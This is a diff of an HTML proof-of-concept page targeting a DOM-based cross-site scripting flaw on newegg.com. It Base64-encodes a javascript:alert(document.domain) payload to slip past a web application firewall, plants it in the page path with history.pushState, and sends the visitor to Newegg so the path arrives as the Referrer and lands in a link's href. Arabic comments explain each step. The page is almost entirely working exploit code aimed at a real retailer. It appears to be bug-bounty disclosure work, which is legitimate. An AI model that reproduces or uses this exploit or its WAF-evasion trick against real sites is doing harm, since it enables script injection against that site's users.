@@ -1,27 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>PoC Mouad</title>
+    <title>PoC Mouad - Newegg DOM XSS</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family: Arial, sans-serif;">
 
-    <h1>Newegg Vulnerability Lab</h1>
+    <h1 style="color: #ff9900;">Newegg Vulnerability Lab</h1>
+    <p>Target: Breadcrumb DOM Injection</p>
+    
+    <br><br>
+
     <a id="attack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:red; color:white; text-decoration:none; font-weight:bold;">
-        CLICK TO TRIGGER 🚀
+       style="padding:20px 40px; background:red; color:white; text-decoration:none; font-weight:bold; border-radius:5px; box-shadow: 0 5px 15px rgba(255,0,0,0.4);">
+       CLICK TO TRIGGER EXPLOIT 🚀
     </a>
 
     <script>
-        // المتغير الأول لفتح النافذة
-        var payload = "javascript:alert(11)";
-        
-        // تصحيح السطر أدناه بإغلاق علامة الاقتباس قبل علامة الـ +
-        var attackPath = "/VORTEX/v/%EF%BC%9C/strong%EF%BC%9E%EF%BC%9Ch1%EF%BC%9Emouad%EF%BC%9C/h1%EF%BC%9E" + payload;
+        /**
+         * شرح الاستغلال:
+         * 1. نقوم بتشفير الـ Payload باستخدام Base64 لتجاوز الـ WAF.
+         * 2. نستخدم pushState لتغيير مسار الرابط الحالي ليحتوي على الـ Payload.
+         * 3. عند الضغط على الزر، سينتقل المتصفح لـ Newegg ويرسل الرابط الملغم كـ Referrer.
+         * 4. سكربت Newegg سيأخذ الجزء الثالث من الرابط ويضعه داخل <a href="...">
+         */
 
-        // دفع المسار الجديد إلى شريط العنوان
+        // الـ Payload المشفر: javascript:alert(document.domain)
+        var encodedPayload = 'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p';
+        var payload = atob(encodedPayload);
+
+        /* بناء المسار: 
+           الكود المستهدف يستخدم i.split("/")[3] 
+           الرابط الحالي: http://your-server.com/ (0) / (1) / (2) / (3)
+           لذلك نضع المسار بحيث يكون الـ Payload هو العنصر الرابع
+        */
+        var attackPath = "/exploit/vortex/" + payload;
+
+        // تحديث شريط العنوان بدون تحديث الصفحة
         window.history.pushState({}, '', attackPath);
+
+        // تنبيه بسيط لك للتأكد من نجاح التجهيز
+        console.log("Referrer prepared: " + window.location.href);
     </script>
+
 </body>
 </html>
